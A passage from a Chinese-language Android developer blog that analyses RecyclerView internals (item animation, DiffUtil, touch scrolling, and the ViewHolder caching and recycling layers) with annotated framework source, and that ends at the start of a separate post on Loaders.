onLayoutChildern在这种情况下会被调用两次，(之前提到本该被移除的View需要重新添加到ViewGroup中，实现就在这里)参考LinearLayoutManager的实现，源代码实在太长，只复制一些注释 @Override public void onLayoutChildren(RecyclerView.Recycler recycler, RecyclerView.State state) { // layout algorithm: // 1) by checking children and other variables, find an anchor coordinate and an anchor // item position. // 2) fill towards start, stacking from bottom // 3) fill towards end, stacking from top // 4) scroll to fulfill requirements like stack from bottom. // create layout state //omitted.... } 简单来说一共三步: detach and Scrap Views layout那些需要出现在list中的View(包括将要消失的View) 接下来进入第二步layout，在这里确定那些将出现在屏幕外的View的实际位置。 这样LayoutManager就能将必要的信息传递给ItemAnimator 进入ItemAnimator大部分的需要实现的函数在SimpleItemAnimator或者DefaultItemAnimator里面都已经实现好了，所以大部分人的选择就是： 使用DefaultItemAnimator(默认已经设置好了) Implement SimpleItemAnimator(或者DeafaultItemAnimator)，复写一些必要的方法 Animator需要做的一些事 record[Pre|Post]LayoutInformation//记录动画开始和结束的layout信息 animate[Appearance|Disappearance] animatePersistence()//不会改变位置 animateChange()//实际的动画添加位置 这些在DefaultItemAnimator中都有默认的实现动画完成后一定要调用 DispatchAnimationFinished(ViewHolder) 记录动画开始前和结束后的信息，实例代码: @NonNull @Override public ItemHolderInfo recordPreLayoutInformation(RecyclerView.State state, RecyclerView.ViewHolder viewHolder, int changeFlags, List&lt;Object&gt; payloads) { ColorTextInfo info = (ColorTextInfo) super.recordPreLayoutInformation(state, viewHolder, changeFlags, payloads); return getItemHolderInfo((MyViewHolder) viewHolder, info); } @NonNull @Override public ItemHolderInfo recordPostLayoutInformation(@NonNull RecyclerView.State state, @NonNull RecyclerView.ViewHolder viewHolder) { ColorTextInfo info = (ColorTextInfo) super.recordPostLayoutInformation(state, viewHolder); return getItemHolderInfo((MyViewHolder) viewHolder, info); } @Override public ItemHolderInfo obtainHolderInfo() { return new ColorTextInfo(); } canReuseViewHolder的作用:例如notifyItemChanged(position)后，只是某个位置的viewHolder发生了信息改变，那就没有必要创建一个新的ViewHolder，直接提供原有的ViewHolder，提升性能。 3. 常见错误 mAdapter.notifyItemMoved(1,5)不会调用onBindViewHolder，不会invalidate 不要在onBindViewHolder中添加onClickListener(以匿名内部类的方式,这会使得position变成final),想象一下，mAdapter.notifyItemMoved(1,5)调用后不会调用onBindViewHolder，这使得点击pos 1时实际传递给listener的是pos 5。 检查RecyclerView.NO_POSITION这个Int值为-1，其实就是itemView被removed，但用户手够快，在View被移除前点击了这个View，那这个onClickListener还是会被调用。 mAdapter.notifyItemChanged(position,payload)如果某个ViewHolder中只是一部分信息改变，将更新内容丢到payload中，最终会调用到onBindViewHolder(ViewHolder,position,List Payloads)，在这里只需要把ViewHolder中的一小部分改变就可以了，这有助于优化新能。 onCreateViewHolder必须返回一个new ViewHolder，不能在本地作为成员变量返回。 RecyclerView.setRecycledViewPool(pool)一个pool只能为为同一个context(Activity)中的RecyclerView使用，因为这些View是与Context相关的，而不同的Activity可能有不同的Theme，Style。 Pro RecyclerView最近看到yigit在relam作的关于recyclerView的演讲，记录下来一些比较重要的点 view:: requestLayout的效果，requestLayout会一直地向上请求直到根视图，next Frame开始时，所有的子View都将调用自身的measure(onMeasure)和layout(onLayout)方法如果子View不曾requestLayout,之前的measure结果会被cache下来，节省measure和layout的时间。 在RecyclerView中，在itemView的onBIndView方法中调用ImageLoader的加载图片方法，由于图片加载是异步操作，最终会调用ImageView的setImageBitmap方法。而在ImageView的实现中，setImageBitmap方法最终会调用requestLayout方法，最终会一层层向上传递到recyclerView中，就像这样```javaimageView setImageBitmap imageView requestLayout itemView requestLayout recyclerView requestLayout 而recyclerView的requestLayout方法会在next Frame重新position所有的child(very expensive!)为此，recyclerView提供了一个setHasFixedSize方法，设置为true表明recyclerView自身不会因为childView的变化而resize，这样recyclerVeiw就不会调用requestLayout方法(如果去看RecyclerView的源码，可以看到mEatRequestLayout这个变量，也就是避免重复调用requestLayout造成性能损耗。)，不会造成所有的childView都被重新测量一遍。在ImageView(2011年之后的版本)中，setImageDrawable方法大致长这样： ```java void setImageDrawable(Drawable drawable){ if(mDrawable != drawable){ int oldWidth = mDrawableWidth; int oldHeight = mDrawableHeight; updateDrawable(drawable) if(oldWidth!=mDrawableWidth||oldHeight!=mDrawableHeight){ requestLayout(); } invalidate(); } } 简单来说就是判断下前后图像的宽度或高度是否发生了变化，如果无变化则不需调用requestLayout方法，只需要reDraw。也就避免了这种性能的损耗。但是，TextView的implementation则复杂的多，并没有这种优化。实际操作中，API应该能够告诉客户端图片的width和Height,使用AspectRationImageView加载图片。在图片加载完成之前优先使用PlaceHolder，并设定好加载完成应有的尺寸，这样就避免了后期图片加载完成后的requestLayout。 使用SortedList用于进行List变更```javaSortedList mSortedList = new SortedList(Item.class, new SortedListAdapterCallback(mAdapter)){ //override三个方法，懒得抄了 }使用方式十分简单，后面的数据更新操作包括notifyDataChange都被处理好了。onNetwokCallback(List news){ mSortedList.addAll(news);} 对于未发生变化的Item，将直接跳过，实现了最优化的列表数据更新。 - DiffUtil(added in 24.2.0)用于对比数据变更前后的两个List ```java DiffResult result = DiffUtil.calculateDiff( new MyCallback(oldList,newList)); mAdapter.setItems(newList); result.dispatchTo(mAdapter); 只需调用上述方法即可实现列表Item更新及Adapter的notify。DiffUtil的callback有四个方法需要复写，另外有一个方法用于单个Item的部分payload更新。在medium上找到一个现成的，直接借用了。 public class MyDiffCallback extends DiffUtil.Callback{ List&lt;Person&gt; oldPersons; List&lt;Person&gt; newPersons; public MyDiffCallback(List&lt;Person&gt; newPersons, List&lt;Person&gt; oldPersons) { this.newPersons = newPersons; this.oldPersons = oldPersons; } @Override public int getOldListSize() { return oldPersons.size(); } @Override public int getNewListSize() { return newPersons.size(); } @Override public boolean areItemsTheSame(int oldItemPosition, int newItemPosition) { return oldPersons.get(oldItemPosition).id == newPersons.get(newItemPosition).id; } @Override public boolean areContentsTheSame(int oldItemPosition, int newItemPosition) { return oldPersons.get(oldItemPosition).equals(newPersons.get(newItemPosition)); } @Nullable @Override public Object getChangePayload(int oldItemPosition, int newItemPosition) { //you can return particular field for changed item.//这里的object会被带到onBindViewHolder中 return super.getChangePayload(oldItemPosition, newItemPosition); } } 这些方法会帮助完成remove和add等方法。 viewHolder的生命周期 onCreateonBindViewHolder(获取video资源)onViewAttachedToWindow(可以在这里开始播放视频)onViewDetachedFromWindow(可以在这里停止播放视频，随时有可能重新被直接attach，这过程中不会调用onBind方法)onRecycled(可以在这里释放Video资源或者释放Bitmap引用，这之后再使用该ViewHolder需要调用onBind方法) recyclerView的一些defer操作对于日常开发的帮助recyclerView会将一些pending操作defer到next frame。eg:```javarecyclerView.scrollToPosition(15);int x = layoutManager.getFirstVisiblePosition();//此时x并不等于15，因为下一帧并未开始。真正的执行scroll操作需要等到nextFrame执行后才能生效，具体一点的话，就是下一个执行layout的message的callback还未被执行。// 又例如，在onCreate中调用recyclerView.scrollToPosition(15);//在netWorkCallback中调用setAdapter，这时recyclerView会利用pending的15 position。原因在于recyclerView会判断如果layoutManager和adapter是否为null，如果都为null。skip layout。 // - 在getItemViewType中返回R.layout.itemLayout的好处。onCreateViewHolder(ViewGroup viewParent,int ViewType) { View itemView = inflate.inflate(ViewType,parent,false); return XXXHolder(itemView);//aapt可以确保R.layout.xxxx是unique的。} - ClickListener的实现 在onCreateViewHolder中传一个callback，不要在onBindViewHolder中传，不要把onBindViewHolder中的position变为final的。getAdapterPositon可能为NO_POSITION(-1)，因为RecyclerView的UI更新会被defer到next Frame，在下一帧更新被执行前，用户可能已经点击了item，这时的position就有可能是-1(这种情况发生在点击后删除了所有的item数据，这时获得的position就类似于list的indexAt，当然是-1。). - LayoutManager只知道LayoutPosition，并不知道AdapterPosition Items在Adapter的数据集中的顺序可能会随时变更，但recyclerView可能并不会调用onBindViewHolder方法，这也就是onBindViewHolder中的position并不可靠的原因。因为viewHolder本身是backed by Item的，而viewHolder的getAdapterPosition能够正确地反应Item在数据集中的顺序。 ## 4.更新 RecyclerView 26.1.0源码摘取部分分析 ### 4.1 TouchEvent的处理逻辑 关于RecyclerView 的TouchEvent的处理逻辑： 直接来看onTouchEvent中的ACTION_MOVE的处理吧： ```java if (mScrollState == SCROLL_STATE_DRAGGING) { mLastTouchX = x - mScrollOffset[0]; mLastTouchY = y - mScrollOffset[1]; if (scrollByInternal( canScrollHorizontally ? dx : 0, canScrollVertically ? dy : 0, vtev)) { getParent().requestDisallowInterceptTouchEvent(true); } if (mGapWorker != null &amp;&amp; (dx != 0 || dy != 0)) { mGapWorker.postFromTraversal(this, dx, dy); } } boolean scrollByInternal(int x, int y, MotionEvent ev) { int unconsumedX = 0, unconsumedY = 0; int consumedX = 0, consumedY = 0; consumePendingUpdateOperations(); if (mAdapter != null) { eatRequestLayout(); onEnterLayoutOrScroll(); TraceCompat.beginSection(TRACE_SCROLL_TAG); fillRemainingScrollValues(mState);//从viewFlinger的overScroller中查询还剩多少distance,赋值给mState if (x != 0) { consumedX = mLayout.scrollHorizontallyBy(x, mRecycler, mState); unconsumedX = x - consumedX; } if (y != 0) { consumedY = mLayout.scrollVerticallyBy(y, mRecycler, mState); unconsumedY = y - consumedY; // 以scrollVerticallyBy为例，内部调用了scrollBy方法。 //这里面分两步，一个是fill，一个是offsetChildrenVertical } TraceCompat.endSection(); repositionShadowingViews(); onExitLayoutOrScroll(); resumeRequestLayout(false); } if (!mItemDecorations.isEmpty()) { invalidate(); } if (dispatchNestedScroll(consumedX, consumedY, unconsumedX, unconsumedY, mScrollOffset, TYPE_TOUCH)) { // Update the last touch co-ords, taking any scroll offset into account mLastTouchX -= mScrollOffset[0]; mLastTouchY -= mScrollOffset[1]; if (ev != null) { ev.offsetLocation(mScrollOffset[0], mScrollOffset[1]); } mNestedOffsets[0] += mScrollOffset[0]; mNestedOffsets[1] += mScrollOffset[1]; } else if (getOverScrollMode() != View.OVER_SCROLL_NEVER) { if (ev != null &amp;&amp; !MotionEventCompat.isFromSource(ev, InputDevice.SOURCE_MOUSE)) { pullGlows(ev.getX(), unconsumedX, ev.getY(), unconsumedY); } considerReleasingGlowsOnScroll(x, y); } if (consumedX != 0 || consumedY != 0) { //通知onScrollListner事实上滑动了多少距离 dispatchOnScrolled(consumedX, consumedY); } if (!awakenScrollBars()) { invalidate(); } //只要layoutmanager消费的x和y有一个不为0，就请求requestDisallowInterceptTouchEvent. return consumedX != 0 || consumedY != 0; } 在scrollBy方法中亲测，在一个veticalLinearLayoutManager中，手指往上走的时候,dy是&gt;0的 final int scrolled = absDy &gt; consumed ? layoutDirection * consumed : dy; //layoutDirection在dy&gt;0时为1，在dy&lt;0时为-1 //比如手指往上走，view照理说也该往上走，如果实际消费的移动距离小于外部要求的移动距离绝对值，则使用消费了的distance。所以RecyclerView实际消费了的滑动距离（也就是在onScrollListener中获取到的距离)就是在这里决定的。 //下面这个scrolled就是RecyclerView中所有child实际上滑动的距离。 final int consumed = mLayoutState.mScrollingOffset + fill(recycler, mLayoutState, state, false); if (consumed &lt; 0) { if (DEBUG) { Log.d(TAG, &quot;Don&#39;t have any more elements to scroll&quot;); } return 0; } final int scrolled = absDy &gt; consumed ? layoutDirection * consumed : dy; mOrientationHelper.offsetChildren(-scrolled); //亲测，手指往上走的时候，这个scrolled是&gt;0的，也就是传给offsetChildren的参数是负数，所以view在视觉上会往上走。这里面也是实际上调用了view.offsetTopAndBottom方法。 再看这个fill方法 int fill(RecyclerView.Recycler recycler, LayoutState layoutState, RecyclerView.State state, boolean stopOnFocusable) { // max offset we should set is mFastScroll + available final int start = layoutState.mAvailable; //手指往上走的时候这个是负数 //关于这个available，注释里说的是 Number of pixels that we should fill, in the layout direction. if (layoutState.mScrollingOffset != LayoutState.SCROLLING_OFFSET_NaN) { // TODO ugly bug fix. should not happen if (layoutState.mAvailable &lt; 0) { //手指往上走的时候因为mAvailable&lt;0会走到这里 layoutState.mScrollingOffset += layoutState.mAvailable; // mScrollingOffset的注释说的是：Used when LayoutState is constructed in a scrolling state. // It should be set the amount of scrolling we can make without creating a new view. // Settings this is required for efficient view recycling. } recycleByLayoutState(recycler, layoutState); // 这里面就是根据layoutState的direction开始回收view //比如手指往上走，就调用recycleViewsFromStart，手指往下走就调用recycleViewsFromEnd。也说得通，手指往上走，顶部的view被滑出屏幕，当然可以开始回收流程 } int remainingSpace = layoutState.mAvailable + layoutState.mExtra; LayoutChunkResult layoutChunkResult = mLayoutChunkResult; while ((layoutState.mInfinite || remainingSpace &gt; 0) &amp;&amp; layoutState.hasMore(state)) { layoutChunkResult.resetInternal(); if (VERBOSE_TRACING) { TraceCompat.beginSection(&quot;LLM LayoutChunk&quot;); } layoutChunk(recycler, state, layoutState, layoutChunkResult); //主要的工作就在layoutChunk里面完成 if (VERBOSE_TRACING) { TraceCompat.endSection(); } if (layoutChunkResult.mFinished) { break; } layoutState.mOffset += layoutChunkResult.mConsumed * layoutState.mLayoutDirection; /** * Consume the available space if: * * layoutChunk did not request to be ignored * * OR we are laying out scrap children * * OR we are not doing pre-layout */ if (!layoutChunkResult.mIgnoreConsumed || mLayoutState.mScrapList != null || !state.isPreLayout()) { layoutState.mAvailable -= layoutChunkResult.mConsumed; // we keep a separate remaining space because mAvailable is important for recycling remainingSpace -= layoutChunkResult.mConsumed; } if (layoutState.mScrollingOffset != LayoutState.SCROLLING_OFFSET_NaN) { layoutState.mScrollingOffset += layoutChunkResult.mConsumed; if (layoutState.mAvailable &lt; 0) { layoutState.mScrollingOffset += layoutState.mAvailable; } recycleByLayoutState(recycler, layoutState);//这里是回收View的入口 } if (stopOnFocusable &amp;&amp; layoutChunkResult.mFocusable) { break; } } return start - layoutState.mAvailable; } 打断点发现，在scrollBy的过程中通过layoutChunk方法一直走到Recycler.tryGetViewHolderForPositionByDeadline tryGetViewHolderForPositionByDeadline方法用于获取一个viewHolder // 0) If there is a changed scrap, try to find from there holder = getChangedScrapViewForPosition(position); // 1) Find by position from scrap/hidden list/cache holder = getScrapOrHiddenOrCachedHolderForPosition(position, dryRun); // 2) Find from scrap/cache via stable ids, if exists if (mAdapter.hasStableIds()) { holder = getScrapOrCachedViewForId(mAdapter.getItemId(offsetPosition), type, dryRun); } //这中间还有一个 final View view = mViewCacheExtension.getViewForPositionAndType(this, position, type); // fallback to pool holder = getRecycledViewPool().getRecycledView(type); //last resort holder = mAdapter.createViewHolder(RecyclerView.this, type); 以上即为获取holder的优先顺序，获取到holder之后就是bindViewHolder了 回收过程在LinearLayoutManager的scrollBy -&gt; fill -&gt;recycleByLayoutState -&gt;recycleViewsFromStart(遍历children,确保移除不可见的child)处置view的逻辑在recycleViewHolderInternal中首先是尝试mCachedViews（ ArrayList，默认最大mViewCacheMax = 2，实际debug中是3） // Retire oldest cached view int cachedViewSize = mCachedViews.size(); if (cachedViewSize &gt;= mViewCacheMax &amp;&amp; cachedViewSize &gt; 0) { recycleCachedViewAt(0); // 将list中第一个viewHolder踢到Pool -&gt;这里面调用了addViewHolderToRecycledViewPool cachedViewSize--; } // 这之后将新来的这个holder加到list的尾部，现在看来就是3 //接下来应该是从recyclerViewPool中根据对应的类型找到合适的ScrapHeap，添加进去。目前看来，pool就是根据不同的viewType维持了不同的ArrayList&lt;ViewHolder&gt;, view被recycle的时候是否可以去移除对应的View中ImageView的drawable?答案是不能亲测下来，在onViewDetachedFromWindow中去setImageDrawable(null)的话。手指慢慢将一个ImageView滑出屏幕，然后再滑回来的话。这个ImageView的背景就没有了。显然这个过程中没有重新去走onBindViewHolder方法。但是滑动出屏幕确实调用到了mAdapter.onViewDetachedFromWindow(viewHolder)方法。 那么detach下来的View被丢到哪里了？ 从源码来看：整个的调用流程应该是这样的：RecyclerView.onTouchEvent -&gt; RecyclerView.scrollByInternal -&gt; RecyclerView.scrollVerticallyBy -&gt; LinearLayoutManager.scrollBy -&gt; LinearLayoutManager.fill -&gt; LinearLayoutManger.recycleByLayoutSate -&gt;LinearLayoutManager.recycleViewFromStart -&gt; LinearLayoutManager.recycleChildren -&gt;LayoutManager.removeAndRecycleViewAt(index,recycler) public void removeAndRecycleViewAt(int index, Recycler recycler) { final View view = getChildAt(index); removeViewAt(index); recycler.recycleView(view); } removeViewAt方法长这样： @Override public void removeViewAt(int index) { final View child = RecyclerView.this.getChildAt(index); if (child != null) { dispatchChildDetached(child); // Clear any android.view.animation.Animation that may prevent the item from // detaching when being removed. If a child is re-added before the // lazy detach occurs, it will receive invalid attach/detach sequencing. child.clearAnimation(); } if (VERBOSE_TRACING) { TraceCompat.beginSection(&quot;RV removeViewAt&quot;); } RecyclerView.this.removeViewAt(index); //这一步执行完,getParent() =null if (VERBOSE_TRACING) { TraceCompat.endSection(); } } 而dispatchChildDetached是在parent.removeChild之前调用的 void dispatchChildDetached(View child) { final ViewHolder viewHolder = getChildViewHolderInt(child); onChildDetachedFromWindow(child); if (mAdapter != null &amp;&amp; viewHolder != null) { mAdapter.onViewDetachedFromWindow(viewHolder);// 走到这里getParent还不会为null } if (mOnChildAttachStateListeners != null) { final int cnt = mOnChildAttachStateListeners.size(); for (int i = cnt - 1; i &gt;= 0; i--) { mOnChildAttachStateListeners.get(i).onChildViewDetachedFromWindow(child); } } } remove完之后就是recycler.recycleView(view)了，具体实现在recycleViewHolderInternal里面.mCachedViews,viewCacheExtension或者recyclerPool中。先看下recycler的内部成员变量结构 public final class Recycler { final ArrayList&lt;ViewHolder&gt; mAttachedScrap = new ArrayList&lt;&gt;(); ArrayList&lt;ViewHolder&gt; mChangedScrap = null; final ArrayList&lt;ViewHolder&gt; mCachedViews = new ArrayList&lt;ViewHolder&gt;(); private final List&lt;ViewHolder&gt; mUnmodifiableAttachedScrap = Collections.unmodifiableList(mAttachedScrap); private int mRequestedCacheMax = DEFAULT_CACHE_SIZE; int mViewCacheMax = DEFAULT_CACHE_SIZE; RecycledViewPool mRecyclerPool; private ViewCacheExtension mViewCacheExtension; static final int DEFAULT_CACHE_SIZE = 2; //.... 下面就是一些method了，可以看到缓存全部都是以ViewHolder为单位的 } Recycler.recycleViewHolderInternal(ViewHolder holder) /** * internal implementation checks if view is scrapped or attached and throws an exception * if so. * Public version un-scraps before calling recycle. */ void recycleViewHolderInternal(ViewHolder holder) { if (holder.isScrap() || holder.itemView.getParent() != null) { //从这里也可以看出来，到了这个时候,parent已经为null了 throw new IllegalArgumentException( &quot;Scrapped or attached views may not be recycled. isScrap:&quot; + holder.isScrap() + &quot; isAttached:&quot; + (holder.itemView.getParent() != null) + exceptionLabel()); } if (holder.isTmpDetached()) { throw new IllegalArgumentException(&quot;Tmp detached view should be removed &quot; + &quot;from RecyclerView before it can be recycled: &quot; + holder + exceptionLabel()); } if (holder.shouldIgnore()) { throw new IllegalArgumentException(&quot;Trying to recycle an ignored view holder. You&quot; + &quot; should first call stopIgnoringView(view) before calling recycle.&quot; + exceptionLabel()); } //上面这些exception就不看了 //noinspection unchecked final boolean transientStatePreventsRecycling = holder .doesTransientStatePreventRecycling(); final boolean forceRecycle = mAdapter != null &amp;&amp; transientStatePreventsRecycling &amp;&amp; mAdapter.onFailedToRecycleView(holder); //onFailedToRecycleView就是在这个时候调用到的 boolean cached = false; boolean recycled = false; if (DEBUG &amp;&amp; mCachedViews.contains(holder)) { throw new IllegalArgumentException(&quot;cached view received recycle internal? &quot; + holder + exceptionLabel()); } //强调一下，走到这里，view.getParent() = null if (forceRecycle || holder.isRecyclable()) { //forceRecycle 到这里是false if (mViewCacheMax &gt; 0 //什么都不做的话，mViewCacheMax=3 &amp;&amp; !holder.hasAnyOfTheFlags(ViewHolder.FLAG_INVALID | ViewHolder.FLAG_REMOVED | ViewHolder.FLAG_UPDATE | ViewHolder.FLAG_ADAPTER_POSITION_UNKNOWN)) { // Retire oldest cached view int cachedViewSize = mCachedViews.size();//什么都不做的话，这里是3 if (cachedViewSize &gt;= mViewCacheMax &amp;&amp; cachedViewSize &gt; 0) { //这里其实就是mCachedViews已经满了 recycleCachedViewAt(0); //因为是一个ArrayList,在已经满了的情况下，直接把最老的（第一个）删掉 cachedViewSize--; } int targetCacheIndex = cachedViewSize; if (ALLOW_THREAD_GAP_WORK &amp;&amp; cachedViewSize &gt; 0 &amp;&amp; !mPrefetchRegistry.lastPrefetchIncludedPosition(holder.mPosition)) { // when adding the view, skip past most recently prefetched views int cacheIndex = cachedViewSize - 1; while (cacheIndex &gt;= 0) { int cachedPos = mCachedViews.get(cacheIndex).mPosition; if (!mPrefetchRegistry.lastPrefetchIncludedPosition(cachedPos)) { break; } cacheIndex--; } targetCacheIndex = cacheIndex + 1; } mCachedViews.add(targetCacheIndex, holder);//刚才不是把第一个位置的holder从mCachedViews中删除掉了吗，现在就可以把新来的这个holder加进去了。 cached = true; } if (!cached) { addViewHolderToRecycledViewPool(holder, true); recycled = true; } } else { // NOTE: A view can fail to be recycled when it is scrolled off while an animation // runs. In this case, the item is eventually recycled by // ItemAnimatorRestoreListener#onAnimationFinished. // TODO: consider cancelling an animation when an item is removed scrollBy, // to return it to the pool faster if (DEBUG) { Log.d(TAG, &quot;trying to recycle a non-recycleable holder. Hopefully, it will &quot; + &quot;re-visit here. We are still removing it from animation lists&quot; + exceptionLabel()); } } // even if the holder is not removed, we still call this method so that it is removed // from view holder lists. mViewInfoStore.removeViewHolder(holder); if (!cached &amp;&amp; !recycled &amp;&amp; transientStatePreventsRecycling) { holder.mOwnerRecyclerView = null; } } recycleCachedViewAt这个方法里面 void recycleCachedViewAt(int cachedViewIndex) { if (DEBUG) { Log.d(TAG, &quot;Recycling cached view at index &quot; + cachedViewIndex); } ViewHolder viewHolder = mCachedViews.get(cachedViewIndex); if (DEBUG) { Log.d(TAG, &quot;CachedViewHolder to be recycled: &quot; + viewHolder); } addViewHolderToRecycledViewPool(viewHolder, true); mCachedViews.remove(cachedViewIndex); //丢进recyelcerPool的viewHolder就可以从mCachedView中挪掉了 } /** * Prepares the ViewHolder to be removed/recycled, and inserts it into the RecycledViewPool. * * Pass false to dispatchRecycled for views that have not been bound. * * @param holder Holder to be added to the pool. * @param dispatchRecycled True to dispatch View recycled callbacks. */ void addViewHolderToRecycledViewPool(ViewHolder holder, boolean dispatchRecycled) { clearNestedRecyclerViewIfNotNested(holder); if (holder.hasAnyOfTheFlags(ViewHolder.FLAG_SET_A11Y_ITEM_DELEGATE)) { holder.setFlags(0, ViewHolder.FLAG_SET_A11Y_ITEM_DELEGATE); ViewCompat.setAccessibilityDelegate(holder.itemView, null); } if (dispatchRecycled) { dispatchViewRecycled(holder);// mRecyclerListener.onViewRecycled(holder); mAdapter.onViewRecycled(holder);这些方法 } holder.mOwnerRecyclerView = null; //接下来开始丢到recyclerPool中 getRecycledViewPool().putRecycledView(holder); } recyclerpool中的成员变量如下: */ public static class RecycledViewPool { private static final int DEFAULT_MAX_SCRAP = 5; /** * Tracks both pooled holders, as well as create/bind timing metadata for the given type. * * Note that this tracks running averages of create/bind time across all RecyclerViews * (and, indirectly, Adapters) that use this pool. * * 1) This enables us to track average create and bind times across multiple adapters. Even * though create (and especially bind) may behave differently for different Adapter * subclasses, sharing the pool is a strong signal that they&#39;ll perform similarly, per type. * * 2) If {@link #willBindInTime(int, long, long)} returns false for one view, it will return * false for all other views of its type for the same deadline. This prevents items * constructed by {@link GapWorker} prefetch from being bound to a lower priority prefetch. */ static class ScrapData { ArrayList&lt;ViewHolder&gt; mScrapHeap = new ArrayList&lt;&gt;(); int mMaxScrap = DEFAULT_MAX_SCRAP; long mCreateRunningAverageNs = 0; //这个是为prefetcher准备的，prefetcher会根据这种viewType的Holder的平均bindViewHolder时间推断是否能够在下一个Frame前完成bind操作 long mBindRunningAverageNs = 0; } SparseArray&lt;ScrapData&gt; mScrap = new SparseArray&lt;&gt;(); private int mAttachCount = 0; } 所以整个RecyclerPool的缓存就是一个SparseArray，ViewType作为key，一个ArrayList作为value。每种类型的viewHolder都维持了一个ArrayList，默认ArrayList的最大容量为5。 所以整个缓存结构就是三层。mCachedViews（List)是一层，recyclerPool中的sparseArray是第三层，中间还有一个ViewCacheExtension需要用户自定义，不过只需要重写getViewForPositionAndType这一个方法就行。 回收view的过程到此结束，再利用的过程呢? GapWorker.run -&gt; GapWorker.prefetch -&gt; GapWorker.flushTasksWithDeadLine -&gt; GapWorker.flushTaskWithDeadLine -&gt; GapWorker.prefetchPositionWithDeadLine -&gt; Recycler.tryGetViewHolderForPositionByDeadline 打断点发现，在scrollBy的过程中通过layoutChunk方法一直走到Recycler.tryGetViewHolderForPositionByDeadline tryGetViewHolderForPositionByDeadline方法用于获取一个viewHolder```java// 0) If there is a changed scrap, try to find from thereholder = getChangedScrapViewForPosition(position);// 1) Find by position from scrap/hidden list/cacheholder = getScrapOrHiddenOrCachedHolderForPosition(position, dryRun);// 2) Find from scrap/cache via stable ids, if existsif (mAdapter.hasStableIds()) { holder = getScrapOrCachedViewForId(mAdapter.getItemId(offsetPosition), type, dryRun);}//这中间还有一个final View view = mViewCacheExtension.getViewForPositionAndType(this, position, type); // fallback to poolholder = getRecycledViewPool().getRecycledView(type); //last resortholder = mAdapter.createViewHolder(RecyclerView.this, type); 以上即为获取holder的优先顺序，获取到holder之后就是bindViewHolder了 接下来看获得到holder之后，无论是从mCachedViews还是recyclerpool中获得的holder，下面决定是否需要绑定 ```java boolean bound = false; if (mState.isPreLayout() &amp;&amp; holder.isBound()) { //如果已经调用过BindViewHolder方法，就不再去onBindViewHolder了。而是直接将这个viewholder的itemView返回给getViewPosition函数 // do not update unless we absolutely have to. holder.mPreLayoutPosition = position; } else if (!holder.isBound() || holder.needsUpdate() || holder.isInvalid()) { if (DEBUG &amp;&amp; holder.isRemoved()) { throw new IllegalStateException(&quot;Removed holder should be bound and it should&quot; + &quot; come here only in pre-layout. Holder: &quot; + holder + exceptionLabel()); } final int offsetPosition = mAdapterHelper.findPositionOffset(position); bound = tryBindViewHolderByDeadline(holder, offsetPosition, position, deadlineNs);// 这是唯一的onBindViewHolder会被调用到的地方 } mAttachedScrap是一个ArrayList，在RecyclerView的dispatchLayoutStep2中会走到，LayoutManager的onLayoutChildren中会调用 detachAndScrapAttachedViews(recycler)这个方法，其实就是将当前RecyclerView的所有child从后往前添加到这个mAttachedScrap中。 onLayoutChildren继续走，调用到fill -&gt;layoutChunk -&gt; addView -&gt;addViewInt -&gt; unScrap -&gt; unScrapView（这个时候就从mAttachedScrap中移除掉刚才加进去的viewHolder）到这里viewHolder的itemView.getParent = null(而视觉上这个View是明明存在的) 在unScrapView之后，调用 mChildHelper.attachViewToParent(child, index, child.getLayoutParams(), false) 就是重新调用recyclerView.attachViewToParent()方法，这是一个ViewGroup的方法，这里面调用了addInArray方法。而attachViewToParent方法会触发requestLayout，在RecyclerView的requestLayout方法中 @Override public void requestLayout() { if (mEatRequestLayout == 0 &amp;&amp; !mLayoutFrozen) { super.requestLayout();//多数情况下，attachViewToParent不会触发这个方法 } else { mLayoutRequestEaten = true; } } 从命名来看，这里存放的是没有被滑出屏幕的View,也就是当前屏幕上正显示着的View。debug来看，也确实如此。 所以直接在tryGetViewHolderForPositionByDeadline中打断点，发现： 龟速拖动RecylerView的时候，Holder是在getScrapOrHiddenOrCachedHolderForPosition中从mCachedViews中找到的 大概率情况下，从mCachedViews中获取到的viewHolder不会走到上面tryBindViewHolderByDeadline里面，也就是可以直接拿来用的那种。而从viewPool中回收得到的viewHolder都会走onBindViewHolder方法。（不是很确定，打断点几乎都是这种情况）.这么说吧，mCacheViews中拿出来的viewHolder是不需要bind的,recyclerPool里面拿出来的viewHolder是需要重新bind的。 如果想要减少onBindViewHolder的次数的话，可以把mCachedViews的大小设置大一点。这个api应该叫做Recycler.setViewCacheSize()。默认传进去的是2.也就是说RecyclerView顶部和底部默认还藏着一个随时准备被滑动出来的View.每次layoutManager尝试去获取一个View的时候，会更加容易从mCachedViews中获得viewHolder。 mCachedViews和recyclerPool中的view.getParent都为Null。 onViewDetachedFromWindow时只不过才刚刚加入mCachedViews，onViewRecycled才是view被移动到pool中了(这个时候剔除view的一些资源是完全OK（比如setImageDrawable(null)，比如videoPlayer stop）的，因为下次重新取出来的时候反正又要重新bind一遍). RecylerView的缓存提供了viewCacheExtension这个接口，开发者可以自定义一层View的缓存 准确来讲，缓存一共有四层，mAttachedScrap,mCachedViews,viewCacheExtension还有recyclerPool package private的变量是否就不能访问到？比如V7包里的RecyclerView，里面的Recycler是package-private权限。于是新建一个package android.support.v7.widget这样的包。接下来在这个包里面的class就能直接访问RecyclerView中的package-private权限的成员变量了。亲测可行。 一个小问题：itemDecoration在notifyItemRemoved(onDrawOver)的时候，那个decoration好像不在动 4 . 一些参考资料 RecyclerView Animations and Behind the Scenes (Android Dev Summit 2015) ItemAnimator模板 UI ToolKit Demo Yigit Boyar: Pro RecyclerView RecyclerView的源码解析 说的比较清楚","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"RecyclerView","slug":"RecyclerView","permalink":"https://haldir65.github.io/tags/RecyclerView/"}]},{"title":"使用Loader进行异步数据操作","date":"2016-10-15T19:12:22.000Z","path":"2016/10/15/2016-10-15-using-loader-in-android-app/","text":"App中经常有这样的需求:进入一个页面，首先查询数据库，如果数据库数据有效，直接使用数据库数据。否则去网络查询数据，网络数据返回后重新加载数据。很显然，这里的查询数据库和网络请求都需要放到子线程去操作，异步了。android推荐使用Loader进行数据查询，最大的好处就是Laoder会处理好与生命周期相关的事情，Android Developers推出过关于Loaders的介绍视频，Loader就是为了解决这种问题而推出的，Loader具有几点好处 如果Activity挂掉了，Activity中启动了的线程怎么办，如果不处理好有可能导致leak。 activity挂了，而子线程中持有View的强引用，此时再去更新View已经没有意义，View已经不可见了 这条线程所做的工作，加载的资源都白白浪费了，下次还需要重新加载一遍。 1. 